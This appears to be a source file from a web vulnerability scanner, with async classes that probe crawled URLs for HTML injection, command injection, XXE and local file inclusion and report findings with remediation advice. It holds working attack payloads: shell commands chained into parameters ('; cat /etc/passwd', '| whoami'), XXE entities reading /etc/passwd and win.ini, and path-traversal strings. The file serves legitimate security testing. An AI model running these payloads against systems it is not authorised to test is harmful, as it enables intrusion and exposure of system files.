import asyncio
from .base import BaseScanner
from common import TestingZone, event_manager

class HTMLInjectionScanner(BaseScanner):
    def __init__(self, context):
        super().__init__(context)
        self.zone = TestingZone.ZONE_A

    async def run(self):
        await event_manager.emit("log", f"[{self.name}] Starting scan...")
        payloads = ["<h1>Lynx</h1>", "<iframe>", "<b>Bold</b>"]
        tasks = []
        urls_to_scan = self.context.crawled_urls if self.context.crawled_urls else {self.context.target}
        
        for url in urls_to_scan:
            for payload in payloads:
                # Use generic injection points
                for target_url in self.generate_injection_points(url, payload):
                    tasks.append(self.check_payload(payload, target_url))
        chunk_size = 10
        for i in range(0, len(tasks), chunk_size):
            await asyncio.gather(*tasks[i:i+chunk_size])

    async def check_payload(self, payload, url):
        try:
            async with self.context.session.get(url) as response:
                text = await response.text()
                if payload in text:
                    await self.emit_vulnerability(
                        "HTML Injection", 
                        "Payload reflected in response.", 
                        "P3", 
                        "Sanitize user input to prevent HTML injection.", 
                        url=url, 
                        payload=payload
                    )
        except Exception:
            pass

class CommandInjectionScanner(BaseScanner):
    def __init__(self, context):
        super().__init__(context)
        self.zone = TestingZone.ZONE_A

    async def run(self):
        await event_manager.emit("log", f"[{self.name}] Starting scan...")
        payloads = ["; cat /etc/passwd", "| cat /etc/passwd", "; type C:\\Windows\\win.ini", "| type C:\\Windows\\win.ini", "& whoami", "| whoami"]
        tasks = []
        urls_to_scan = self.context.crawled_urls if self.context.crawled_urls else {self.context.target}
        
        for url in urls_to_scan:
            for payload in payloads:
                # Inject into existing params and common injection points
                for target_url in self.generate_injection_points(url, payload):
                     tasks.append(self.check_payload(payload, target_url))
        chunk_size = 10
        for i in range(0, len(tasks), chunk_size):
            await asyncio.gather(*tasks[i:i+chunk_size])

    async def check_payload(self, payload, url):
        try:
            async with self.context.session.get(url) as response:
                text = await response.text()
                sigs = ["root:x:0:0", "[extensions]", "boot loader", "Microsoft Windows"]
                if any(sig in text for sig in sigs):
                    await self.emit_vulnerability(
                        "Command Injection", 
                        f"PoC URL: {url}\nPayload: {payload}", 
                        "P1", 
                        "Sanitize user input and use safe APIs.", 
                        url=url, 
                        payload=payload
                    )
        except Exception:
            pass

class XXEScanner(BaseScanner):
    def __init__(self, context):
        super().__init__(context)
        self.zone = TestingZone.ZONE_A

    async def run(self):
        await event_manager.emit("log", f"[{self.name}] Starting scan...")
        payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file://c:/windows/win.ini" >]><foo>&xxe;</foo>"""
        ]
        tasks = []
        urls_to_scan = self.context.crawled_urls if self.context.crawled_urls else {self.context.target}
        for url in urls_to_scan:
            for payload in payloads:
                tasks.append(self.check_payload(payload, url))
        chunk_size = 10
        for i in range(0, len(tasks), chunk_size):
            await asyncio.gather(*tasks[i:i+chunk_size])

    async def check_payload(self, payload, url):
        headers = {"Content-Type": "application/xml"}
        try:
            async with self.context.session.post(url, data=payload, headers=headers) as response:
                text = await response.text()
                if "root:x:0:0" in text or "[extensions]" in text:
                    await self.emit_vulnerability(
                        "XXE Injection", 
                        f"PoC URL: {url}\nPayload: {payload[:50]}...", 
                        "P1", 
                        "Disable external entity processing.", 
                        url=url, 
                        payload=payload
                    )
        except Exception:
            pass

class LFIScanner(BaseScanner):
    def __init__(self, context):
        super().__init__(context)
        self.zone = TestingZone.ZONE_A

    async def run(self):
        await event_manager.emit("log", f"[{self.name}] Starting scan...")
        payloads = [
            "../../../../../../../../etc/passwd",
            "../../../../../../../../windows/win.ini",
            "/etc/passwd",
            "c:\\windows\\win.ini"
        ]
        tasks = []
        urls_to_scan = self.context.crawled_urls if self.context.crawled_urls else {self.context.target}
        for url in urls_to_scan:
            for payload in payloads:
                # Use generic injection points (includes param replacement)
                for target_url in self.generate_injection_points(url, payload):
                    tasks.append(self.check_payload(payload, target_url))
        chunk_size = 10
        for i in range(0, len(tasks), chunk_size):
            await asyncio.gather(*tasks[i:i+chunk_size])

    async def check_payload(self, payload, url):
        try:
            async with self.context.session.get(url) as response:
                text = await response.text()
                if any(sig in text for sig in ["root:x:0:0", "[extensions]"]):
                    await self.emit_vulnerability(
                        "Local File Inclusion", 
                        f"PoC URL: {url}\nPayload: {payload}", 
                        "P2", 
                        "Validate user input against a whitelist of allowed files.", 
                        url=url, 
                        payload=payload
                    )
        except Exception:
            pass
